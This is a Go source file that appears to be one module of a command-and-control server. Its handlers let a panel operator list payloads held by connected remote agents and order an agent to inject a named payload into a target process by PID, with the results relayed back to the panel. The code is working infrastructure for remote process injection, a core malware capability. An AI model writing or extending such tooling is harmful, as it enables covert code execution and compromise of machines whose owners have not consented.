package payload

import (
	"encoding/json"

	"agentmanager/modules/panelapp"
)

type Service struct {
	app *panelapp.App
}

func NewService(app *panelapp.App) *Service {
	s := &Service{app: app}
	app.Panel.RegisterHandler("payload_list_get", app.Guarded(s.onPayloadListGet))
	app.Panel.RegisterHandler("payload_inject", app.Guarded(s.onPayloadInject))
	app.Agent.RegisterHandler("payload_list_result", s.onPayloadListResult)
	app.Agent.RegisterHandler("payload_inject_result", s.onPayloadInjectResult)
	app.Agent.RegisterHandler("payload_register_request", func(agentConnID string, payload json.RawMessage) {})
	return s
}

func (s *Service) onPayloadListGet(panelConnID string, payload json.RawMessage) {
	var p struct {
		AgentID string `json:"agent_id"`
	}
	if err := json.Unmarshal(payload, &p); err != nil || p.AgentID == "" {
		return
	}
	for _, conn := range s.app.Reg.ConnsFor(p.AgentID) {
		s.app.Agent.EmitTo(conn, "payload_list_get", map[string]interface{}{})
	}
}

func (s *Service) onPayloadListResult(agentConnID string, payload json.RawMessage) {
	id, ok := s.app.Reg.AgentFor(agentConnID)
	if !ok {
		return
	}
	var p struct {
		Payloads string `json:"payloads"`
	}
	json.Unmarshal(payload, &p)
	s.app.Publish("procs:"+id, "payload_list_result", map[string]interface{}{
		"agent_id": id,
		"payloads": p.Payloads,
	})
}

func (s *Service) onPayloadInject(panelConnID string, payload json.RawMessage) {
	var p struct {
		AgentID string `json:"agent_id"`
		PID     uint32 `json:"pid"`
		Name    string `json:"name"`
	}
	if err := json.Unmarshal(payload, &p); err != nil || p.AgentID == "" || p.Name == "" {
		return
	}
	for _, conn := range s.app.Reg.ConnsFor(p.AgentID) {
		s.app.Agent.EmitTo(conn, "payload_inject", map[string]interface{}{
			"pid":  p.PID,
			"name": p.Name,
		})
	}
}

func (s *Service) onPayloadInjectResult(agentConnID string, payload json.RawMessage) {
	id, ok := s.app.Reg.AgentFor(agentConnID)
	if !ok {
		return
	}
	s.app.Publish("procs:"+id, "payload_inject_result", payload)
}
